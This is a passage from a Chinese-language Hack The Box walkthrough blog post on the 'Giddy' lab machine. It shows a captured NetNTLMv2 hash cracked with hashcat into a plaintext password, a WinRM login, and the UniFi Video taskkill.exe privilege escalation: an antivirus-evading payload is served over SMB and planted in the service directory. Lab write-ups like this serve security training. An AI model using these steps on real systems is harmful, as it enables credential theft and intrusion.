class="string">[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:e37725686fbeb903:F5EA75E3874958C60E9A25EF30E749CC:0101000000000000001A65B6ACB1D801D9F9F88C677428680000000002000800450057003400520001001E00570049004E002D0041004400450054005A0033005900380057005900580004003400570049004E002D0041004400450054005A003300590038005700590058002E0045005700340052002E004C004F00430041004C000300140045005700340052002E004C004F00430041004C000500140045005700340052002E004C004F00430041004C0007000800001A65B6ACB1D80106000400020000000800300030000000000000000000000000300000C95EB283C25BD1671DBF9F855FFC7F09B14B85A0503F7FFCB402B0CE8AF1636E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000</span></span><br><span class="line"><span class="string">[*] Skipping previously captured hash for GIDDY\Stacy</span></span><br><span class="line"><span class="string">[*] Skipping previously captured hash for GIDDY\Stacy</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.5) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 6857/13779 MB (2048 MB allocatable), 8MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 2 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 1 sec</span><br><span class="line"></span><br><span class="line">STACY::GIDDY:e37725686fbeb903:f5ea75e3874958c60e9a25ef30e749cc:0101000000000000001a65b6acb1d801d9f9f88c677428680000000002000800450057003400520001001e00570049004e002d0041004400450054005a0033005900380057005900580004003400570049004e002d0041004400450054005a003300590038005700590058002e0045005700340052002e004c004f00430041004c000300140045005700340052002e004c004f00430041004c000500140045005700340052002e004c004f00430041004c0007000800001a65b6acb1d80106000400020000000800300030000000000000000000000000300000c95eb283c25bd1671dbf9f855ffc7f09b14b85a0503f7ffcb402b0ce8af1636e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000:xNnWo6272k7x</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: STACY::GIDDY:e37725686fbeb903:f5ea75e3874958c60e9a2...000000</span><br><span class="line">Time.Started.....: Tue Aug 16 20:18:49 2022 (1 sec)</span><br><span class="line">Time.Estimated...: Tue Aug 16 20:18:50 2022 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  2485.2 kH/s (2.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 2695168/14344385 (18.79%)</span><br><span class="line">Rejected.........: 0/2695168 (0.00%)</span><br><span class="line">Restore.Point....: 2686976/14344385 (18.73%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: xamuraix -&gt; wykeisha</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 71c Util: 77%</span></span><br><span class="line"></span><br><span class="line">Started: Tue Aug 16 20:18:22 2022</span><br><span class="line">Stopped: Tue Aug 16 20:18:52 2022</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stacy:xNnWo6272k7x</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ evil-winrm -i 10.10.10.104 -u stacy -p <span class="string">&#x27;xNnWo6272k7x&#x27;</span>                                                </span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; </span><br></pre></td></tr></table></figure>
+
+<p>能走winrm不能走RDP。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Stacy\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        6/17/2018   9:36 AM              6 unifivideo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这东西我去搜了一眼，它有个错误配置的漏洞，在启动和停止服务时，它会尝试加载并执行“C：\ProgramData\unifi-video\taskkill.exe”的文件。但是，默认情况下，此文件根本不存在于应用程序目录中。我只用生成一个木马放在制定位置即可，但是我并没有遍历服务的权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated</span><br><span class="line">reg.exe : ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line">    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object &#123;<span class="variable">$_</span>.State -like <span class="string">&#x27;Running&#x27;</span>&#125;</span><br><span class="line">Access denied </span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Get-WmiObject win32_service | Select-Object Name, State, PathName | W ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException</span><br><span class="line">    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand</span><br><span class="line">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; wmic service get name,displayname,pathname,startmode | findstr /i <span class="string">&quot;Auto&quot;</span> | findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">At line:1 char:121</span></span><br><span class="line"><span class="string">+ ...  findstr /i &quot;</span>Auto<span class="string">&quot; | findstr /i /v &quot;</span>C:\Windows\\&quot; | findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">+                                                                       ~~~</span></span><br><span class="line"><span class="string">The string is missing the terminator: &quot;</span>.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException</span><br><span class="line">    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand</span><br><span class="line">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; </span><br></pre></td></tr></table></figure>
+
+<p>传了个nc被windows defener干掉了。做了个免杀载荷，通过SMB传就行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HackTheBox$ smbserver.py  share . -smb2support</span><br><span class="line">Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.104,49716)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (\,GIDDY)</span><br><span class="line">[*] User GIDDY\ authenticated successfully</span><br><span class="line">[*] :::00::aaaaaaaaaaaaaaaa</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:share)</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br><span class="line">[*] Disconnecting Share(2:share)</span><br><span class="line">[*] Closing down connection (10.10.10.104,49716)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>
+
+<p>没权限查看服务路径，无所谓的，powershell可以很方便的读注册表曲线查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UniFiVideoService              Type            : 16                                                                                                                                                                                                      </span><br><span class="line">                               Start           : 2                                                                                                                                                                                                       </span><br><span class="line">                               ErrorControl    : 1                                                                                                                                                                                                       </span><br><span class="line">                               ImagePath       : C:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService                                                                                                                                        </span><br><span class="line">                               DisplayName     : Ubiquiti UniFi Video                                                                                                                                                                                    </span><br><span class="line">                               DependOnService : &#123;Tcpip, Afd&#125;                                                                                                                                                                                            </span><br><span class="line">                               ObjectName      : LocalSystem                                                                                                                                                                                             </span><br><span class="line">                               Description     : Ubiquiti UniFi Video Service</span><br></pre></td></tr></table></figure>
+
+<p>服务太多了，显示不出来，咋就不能RDP呢，不过没关系,筛选路径去匹配：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> HKLM:\system\currentcontrolset\services&gt; <span class="built_in">ls</span> | findstr <span class="string">&quot;unifi-video&quot;</span></span><br><span class="line">                               ImagePath       : C:\ProgramData\unifi<span class="literal">-video</span>\avService.exe //RS//UniFiVideoService</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> HKLM:\system\currentcontrolset\services&gt; <span class="built_in">ls</span> | findstr <span class="string">&quot;UniFiVideoService&quot;</span></span><br><span class="line">UniFiVideoService              <span class="built_in">Type</span>            : <span class="number">16</span></span><br><span class="line">                               ImagePath       : C:\ProgramData\unifi<span class="literal">-video</span>\avService.exe //RS//UniFiVideoService</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> HKLM:\system\currentcontrolset\services&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这服务会自动重启，只需停止就行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\ProgramData&gt; copy taskkill.exe \ProgramData\unifi-video\taskkill.exe</span><br><span class="line">*Evil-WinRM* PS C:\ProgramData&gt; Stop-Service -Name Unifivideoservice -Force</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br><span class="line">Warning: Waiting <span class="keyword">for</span> service <span class="string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816214441074.png" srcset="/img/loading.gif" lazyload alt="image-20220816214441074"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows/" class="print-no-link">#Windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Giddy</div>
+      <div>https://crazyinside.github.io/post/HackTHeBox-Giddy.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Gobox.html" title="HTB Walkthrough - Gobox">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Gobox</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Fulcrum.html" title="HTB Walkthrough - Fulcrum">
+                        <span class="hidden-mobile">HTB Walkthrough - Fulcrum</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
